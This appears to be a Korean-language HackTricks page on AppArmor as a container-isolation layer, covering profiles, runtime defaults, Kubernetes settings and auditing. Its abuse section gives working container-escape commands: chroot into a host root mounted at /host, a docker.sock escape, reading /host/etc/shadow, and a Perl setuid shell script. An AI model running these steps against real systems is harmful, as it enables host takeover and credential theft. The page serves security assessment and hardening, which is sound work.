# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## 컨테이너 격리에서의 역할

AppArmor는 프로그램별 profile을 통해 제한을 적용하는 **Mandatory Access Control** 시스템입니다. 사용자 및 그룹 소유권에 크게 의존하는 기존 DAC 검사와 달리, AppArmor는 process 자체에 연결된 policy를 kernel이 적용하도록 합니다. 컨테이너 환경에서는 workload가 작업을 시도할 수 있을 만큼의 기존 privilege를 가지고 있더라도, AppArmor profile이 관련 path, mount, network 동작 또는 capability 사용을 허용하지 않으면 거부될 수 있다는 점이 중요합니다.

가장 중요한 개념은 AppArmor가 **path-based**라는 점입니다. SELinux처럼 label을 사용하는 대신 path rule을 통해 filesystem access를 판단합니다. 따라서 이해하기 쉽고 강력하지만, bind mount와 다른 path layout에는 세심한 주의가 필요합니다. 동일한 host content에 다른 path를 통해 접근할 수 있게 되면 policy의 효과가 operator가 처음 예상한 것과 다를 수 있습니다.

## 컨테이너 격리에서의 역할

컨테이너 security review는 capabilities와 seccomp에서 끝나는 경우가 많지만, 이러한 검사를 통과한 이후에도 AppArmor는 계속 중요합니다. 필요 이상으로 많은 privilege를 가진 container나, 운영상의 이유로 추가 capability 하나가 필요한 workload를 생각해 보십시오. AppArmor는 여전히 file access, mount 동작, networking 및 execution pattern을 제한하여 명백한 abuse path를 차단할 수 있습니다. 따라서 "애플리케이션이 작동하도록 하기 위해" AppArmor를 비활성화하면, 단순히 위험한 configuration이 적극적으로 exploit 가능한 configuration으로 조용히 바뀔 수 있습니다.

## Lab

Host에서 AppArmor가 활성화되어 있는지 확인하려면 다음을 사용합니다:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
현재 container process가 어떤 환경에서 실행 중인지 확인하려면:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
차이점은 유용한 정보를 제공합니다. 일반적인 경우 프로세스에는 runtime이 선택한 profile에 연결된 AppArmor context가 표시되어야 합니다. unconfined 상태에서는 이러한 추가 제한 계층이 사라집니다.

Docker가 적용했다고 인식하는 내용을 확인할 수도 있습니다:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Runtime Usage

호스트가 지원하는 경우 Docker는 기본 또는 custom AppArmor profile을 적용할 수 있습니다. Podman도 AppArmor 기반 시스템에서 AppArmor와 통합할 수 있지만, SELinux 우선 배포판에서는 다른 MAC system이 주로 사용되는 경우가 많습니다. Kubernetes는 실제로 AppArmor를 지원하는 노드에서 workload 수준의 AppArmor policy를 노출할 수 있습니다. LXC 및 관련 Ubuntu 계열 system-container 환경에서도 AppArmor를 광범위하게 사용합니다.

실무적으로 중요한 점은 AppArmor가 "Docker feature"가 아니라는 것입니다. AppArmor는 여러 runtime이 적용할 수 있는 host-kernel feature입니다. 호스트가 이를 지원하지 않거나 runtime이 unconfined 상태로 실행되도록 설정된 경우, 기대하는 protection은 실제로 존재하지 않습니다.

Kubernetes의 경우 최신 API는 `securityContext.appArmorProfile`입니다. Kubernetes `v1.30`부터 기존 beta AppArmor annotations는 deprecated되었습니다. 지원되는 호스트에서 `RuntimeDefault`는 default profile이며, `Localhost`는 노드에 이미 로드되어 있어야 하는 profile을 가리킵니다. 이는 review 과정에서 중요합니다. manifest가 AppArmor를 인식하는 것처럼 보여도 실제로는 node-side support와 미리 로드된 profile에 전적으로 의존할 수 있기 때문입니다.

한 가지 미묘하지만 유용한 operational detail은 `appArmorProfile.type: RuntimeDefault`를 명시적으로 설정하는 것이 field를 단순히 생략하는 것보다 더 엄격하다는 점입니다. field를 명시적으로 설정했는데 노드가 AppArmor를 지원하지 않으면 admission이 실패해야 합니다. field를 생략하면 workload가 AppArmor가 없는 노드에서도 실행될 수 있으며, 단순히 추가적인 confinement layer를 적용받지 않을 수 있습니다. 공격자 관점에서는 manifest와 실제 node state를 모두 확인해야 하는 좋은 이유가 됩니다.

Docker를 사용할 수 있는 AppArmor 호스트에서 가장 잘 알려진 default는 `docker-default`입니다. 이 profile은 Moby의 AppArmor template에서 생성되며, 일부 capability 기반 PoC가 default container에서 여전히 실패하는 이유를 설명한다는 점에서 중요합니다. 대략적으로 `docker-default`는 일반적인 networking을 허용하고, `/proc`의 상당 부분에 대한 write를 거부하며, `/sys`의 민감한 영역에 대한 access를 거부하고, mount operation을 차단하며, 일반적인 host-probing primitive로 사용할 수 없도록 ptrace를 제한합니다. 이러한 baseline을 이해하면 "container에 `CAP_SYS_ADMIN`이 있다"는 것과 "container가 내가 관심 있는 kernel interface를 대상으로 실제로 해당 capability를 사용할 수 있다"는 것을 구분하는 데 도움이 됩니다.

## Profile Management

AppArmor profiles는 일반적으로 `/etc/apparmor.d/` 아래에 저장됩니다. 일반적인 naming convention은 executable path의 slash를 dot으로 바꾸는 것입니다. 예를 들어 `/usr/bin/man`에 대한 profile은 일반적으로 `/etc/apparmor.d/usr.bin.man`에 `/etc/apparmor.d/usr.bin.man`로 저장됩니다. 이 detail은 defense와 assessment 모두에서 중요합니다. active profile name을 알고 있으면 호스트에서 해당 file을 빠르게 찾을 수 있는 경우가 많기 때문입니다.

유용한 host-side management commands에는 다음이 포함됩니다:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
컨테이너 보안 참고 자료에서 이러한 명령이 중요한 이유는 profile이 실제로 어떻게 생성되고, 로드되며, complain mode로 전환되고, 애플리케이션 변경 후 수정되는지 설명하기 때문입니다. 운영자가 troubleshooting 중 profile을 complain mode로 전환한 뒤 enforcement로 복원하는 것을 잊는 습관이 있다면, 문서상으로는 컨테이너가 보호되는 것처럼 보여도 실제로는 훨씬 느슨하게 동작할 수 있습니다.

### Profile 생성 및 업데이트

`aa-genprof`는 애플리케이션의 동작을 관찰하고 대화형 방식으로 profile 생성을 지원합니다:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof`는 나중에 `apparmor_parser`로 로드할 수 있는 템플릿 프로필을 생성할 수 있습니다:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
binary가 변경되어 policy를 업데이트해야 할 때 `aa-logprof`는 로그에서 발견된 거부를 재생하고, 운영자가 이를 허용할지 거부할지 결정하도록 지원할 수 있습니다:
```bash
sudo aa-logprof
```
### Logs

AppArmor 거부 기록은 `auditd`, syslog 또는 `aa-notify`와 같은 도구를 통해 확인할 수 있습니다:
```bash
sudo aa-notify -s 1 -v
```
이는 운영 및 offensive 측면에서 유용합니다. Defenders는 이를 사용해 profile을 정교하게 다듬습니다. Attackers는 이를 사용해 정확히 어떤 path 또는 operation이 거부되고 있는지, 그리고 exploit chain을 차단하는 control이 AppArmor인지 알아냅니다.

### 정확한 Profile 파일 식별

runtime에서 container에 대한 특정 AppArmor profile name이 표시되면, 해당 name을 디스크의 profile 파일로 매핑하는 것이 유용한 경우가 많습니다:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
호스트 측 검토 중에 특히 유용합니다. 컨테이너가 `lowpriv` 프로파일로 실행 중이라고 표시하는 것과 실제 규칙이 감사하거나 다시 로드할 수 있는 특정 파일에 저장되어 있다는 사실 사이의 차이를 연결해 주기 때문입니다.

### 감사해야 할 High-Signal Rules

프로파일을 읽을 수 있다면 단순한 `deny` 라인에서 멈추지 마세요. 여러 rule type이 container escape 시도에 대해 AppArmor가 얼마나 효과적으로 대응할 수 있는지를 크게 바꿉니다.

- `ux` / `Ux`: 대상 binary를 unconfined 상태로 실행합니다. 접근 가능한 helper, shell 또는 interpreter가 `ux`로 허용되어 있다면 일반적으로 가장 먼저 테스트할 대상입니다.
- `px` / `Px` 및 `cx` / `Cx`: exec 시 profile transition을 수행합니다. 이것이 자동으로 문제가 되는 것은 아니지만, 현재 프로파일보다 훨씬 광범위한 프로파일로 전환될 수 있으므로 감사할 가치가 있습니다.
- `change_profile`: task가 즉시 또는 다음 exec 시 다른 loaded profile로 전환할 수 있도록 합니다. 대상 프로파일이 더 약하다면 restrictive domain에서 벗어나기 위한 의도된 escape hatch가 될 수 있습니다.
- `flags=(complain)`, `flags=(unconfined)` 또는 최신 `flags=(prompt)`: 프로파일에 어느 정도의 신뢰를 둘지 판단할 때 고려해야 합니다. `complain`은 denial을 enforce하는 대신 log로 기록하고, `unconfined`는 boundary를 제거하며, `prompt`는 순수하게 kernel이 enforce하는 deny가 아니라 userspace의 decision path에 의존합니다.
- `userns` 또는 `userns create,`: 최신 AppArmor policy는 user namespace 생성을 중재할 수 있습니다. 컨테이너 프로파일이 이를 명시적으로 허용한다면, platform이 hardening strategy의 일부로 AppArmor를 사용하더라도 nested user namespace는 여전히 활용할 수 있습니다.

유용한 호스트 측 grep:
```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
이러한 종류의 audit는 수백 개의 일반적인 file rule을 지켜보는 것보다 유용한 경우가 많습니다. breakout이 helper 실행, 새로운 namespace 진입, 또는 덜 제한적인 profile로 탈출하는 것에 의존한다면, 답은 명백한 `deny /etc/shadow r` 형식의 줄이 아니라 이러한 transition 중심 rule에 숨겨져 있는 경우가 많습니다.

## Misconfigurations

가장 명백한 실수는 `apparmor=unconfined`입니다. Administrators는 위험하거나 예상하지 못한 항목을 profile이 올바르게 차단했기 때문에 실패한 application을 debugging할 때 이를 설정하는 경우가 많습니다. 이 flag가 production에 남아 있으면 전체 MAC layer가 사실상 제거된 것입니다.

또 다른 미묘한 문제는 file permissions가 정상적으로 보이기 때문에 bind mounts가 harmless하다고 가정하는 것입니다. AppArmor는 path-based이므로, alternate mount location 아래에 host paths를 노출하면 path rule과 좋지 않게 상호작용할 수 있습니다. 세 번째 실수는 config file의 profile name이 host kernel에서 실제로 AppArmor를 enforcing하고 있지 않다면 별다른 의미가 없다는 점을 잊는 것입니다.

## Abuse

AppArmor가 사라지면 이전에는 제한되었던 operations가 갑자기 동작할 수 있습니다. 예를 들어 bind mounts를 통한 sensitive paths 읽기, 더 사용하기 어렵게 유지되어야 하는 procfs 또는 sysfs의 일부에 access하기, capabilities/seccomp도 허용하는 경우 mount 관련 actions 수행하기, 또는 profile이 일반적으로 deny할 paths 사용하기 등이 있습니다. AppArmor는 capability 기반 breakout 시도가 이론상으로는 `"should work"`하지만 실제로는 실패하는 이유를 설명하는 mechanism인 경우가 많습니다. AppArmor를 제거하면 동일한 시도가 성공하기 시작할 수 있습니다.

path-traversal, bind-mount 또는 mount 기반 abuse chain을 막는 주된 요소가 AppArmor라고 의심된다면, 일반적으로 첫 단계는 profile 유무에 따라 무엇에 access할 수 있게 되는지 비교하는 것입니다. 예를 들어 host path가 container 내부에 mount되어 있다면, 먼저 해당 path를 traverse하고 read할 수 있는지 확인합니다:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
컨테이너에 `CAP_SYS_ADMIN`과 같은 위험한 capability도 있는 경우, 가장 실용적인 테스트 중 하나는 AppArmor가 mount 작업 또는 민감한 kernel filesystem에 대한 access를 차단하는 control인지 확인하는 것입니다:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
bind mount를 통해 host path에 이미 접근할 수 있는 환경에서는 AppArmor를 잃는 것이 read-only information-disclosure issue를 직접적인 host file access로 전환할 수도 있습니다:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
이 명령의 요점은 AppArmor만으로 breakout이 발생한다는 것이 아닙니다. AppArmor가 제거되면 여러 filesystem 및 mount 기반 abuse 경로를 즉시 테스트할 수 있게 된다는 의미입니다.

### 전체 예제: AppArmor 비활성화 + Host Root Mount

컨테이너에 이미 host root가 `/host`에 bind-mounted되어 있다면, AppArmor를 제거하는 것만으로 차단된 filesystem abuse 경로가 완전한 host escape로 이어질 수 있습니다:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
shell이 host filesystem을 통해 실행되면, workload는 사실상 container 경계를 탈출한 상태입니다:
```bash
id
hostname
cat /etc/shadow | head
```
### 전체 예시: AppArmor 비활성화 + Runtime Socket

실제 장벽이 Runtime 상태를 둘러싼 AppArmor였다면, 마운트된 Socket만으로도 완전한 탈출이 가능할 수 있습니다:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
정확한 경로는 mount point에 따라 달라지지만, 결과는 동일합니다. AppArmor는 더 이상 runtime API에 대한 접근을 차단하지 않으며, runtime API는 host를 침해하는 container를 실행할 수 있습니다.

### 전체 예시: Path-Based Bind-Mount Bypass

AppArmor는 path-based이므로 `/proc/**`를 보호한다고 해서 다른 경로를 통해 접근 가능한 동일한 host procfs 콘텐츠까지 자동으로 보호되는 것은 아닙니다:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
영향은 정확히 무엇이 mount되었는지, 그리고 대체 경로가 다른 control도 우회하는지에 따라 달라지지만, 이 패턴은 AppArmor를 단독으로 평가하지 않고 mount layout과 함께 평가해야 하는 가장 분명한 이유 중 하나입니다.

### Full Example: Shebang Bypass

AppArmor policy는 때때로 shebang 처리에 의한 script 실행을 완전히 고려하지 않은 방식으로 interpreter 경로를 대상으로 지정합니다. 과거에는 첫 번째 줄이 confined interpreter를 가리키는 script를 사용하는 사례가 있었습니다:
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
이러한 예시는 profile의 의도와 실제 실행 semantics가 서로 다를 수 있음을 상기시킨다는 점에서 중요합니다. container 환경에서 AppArmor를 검토할 때는 interpreter chain과 대체 실행 경로에 특별히 주의를 기울여야 합니다.

## 확인

이 확인의 목적은 다음 세 가지 질문에 빠르게 답하는 것입니다. host에서 AppArmor가 활성화되어 있는가, 현재 process가 confinement된 상태인가, 그리고 runtime이 실제로 이 container에 profile을 적용했는가?
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
여기서 중요한 점:

- `/proc/self/attr/current`가 `unconfined`를 표시하면, 해당 워크로드는 AppArmor confinement의 보호를 받지 못합니다.
- `aa-status`가 AppArmor를 disabled 또는 not loaded로 표시하면, runtime config에 있는 profile name은 대부분 형식적인 의미만 가집니다.
- `docker inspect`가 `unconfined` 또는 예상하지 못한 custom profile을 표시한다면, filesystem 또는 mount 기반 abuse path가 작동하는 이유인 경우가 많습니다.
- `/sys/kernel/security/apparmor/profiles`에 예상한 profile이 포함되어 있지 않다면, runtime 또는 orchestrator configuration만으로는 충분하지 않습니다.
- supposedly hardened profile에 `ux`, 광범위한 `change_profile`, `userns` 또는 `flags=(complain)` 유형의 rule이 포함되어 있다면, 실제 boundary는 profile name이 암시하는 것보다 훨씬 약할 수 있습니다.

컨테이너가 운영상의 이유로 이미 elevated privileges를 보유하고 있다면, AppArmor를 활성화된 상태로 유지하는 것이 controlled exception과 훨씬 광범위한 security failure를 가르는 차이를 만드는 경우가 많습니다.

## Runtime 기본값

| Runtime / platform | 기본 상태 | 기본 동작 | 일반적인 수동 약화 방법 |
| --- | --- | --- | --- |
| Docker Engine | AppArmor를 지원하는 host에서 기본적으로 활성화 | 별도로 override하지 않는 한 `docker-default` AppArmor profile 사용 | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Host에 따라 다름 | `--security-opt`를 통해 AppArmor를 지원하지만, 정확한 기본값은 host/runtime에 따라 다르며 Docker의 문서화된 `docker-default` profile만큼 보편적이지 않음 | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | 조건부 기본값 | `appArmorProfile.type`이 지정되지 않으면 기본값은 `RuntimeDefault`이지만, node에서 AppArmor가 활성화된 경우에만 적용됨 | `securityContext.appArmorProfile.type: Unconfined`, 약한 profile을 사용하는 `securityContext.appArmorProfile.type: Localhost`, AppArmor를 지원하지 않는 node |
| Kubernetes에서의 containerd / CRI-O | Node/runtime 지원을 따름 | 일반적으로 Kubernetes에서 지원되는 runtime은 AppArmor를 지원하지만, 실제 enforcement는 여전히 node 지원 및 workload 설정에 따라 달라짐 | Kubernetes 행과 동일하며, direct runtime configuration으로 AppArmor를 완전히 건너뛸 수도 있음 |

AppArmor에서 가장 중요한 변수는 runtime만이 아니라 **host**인 경우가 많습니다. AppArmor가 활성화되지 않은 node에서는 manifest의 profile 설정만으로 confinement가 생성되지 않습니다.

## References

- [Kubernetes security context: AppArmor profile fields and node-support behavior](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [Ubuntu 24.04 `apparmor.d(5)` manpage: exec transitions, `change_profile`, `userns`, and profile flags](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
{{#include ../../../../banners/hacktricks-training.md}}
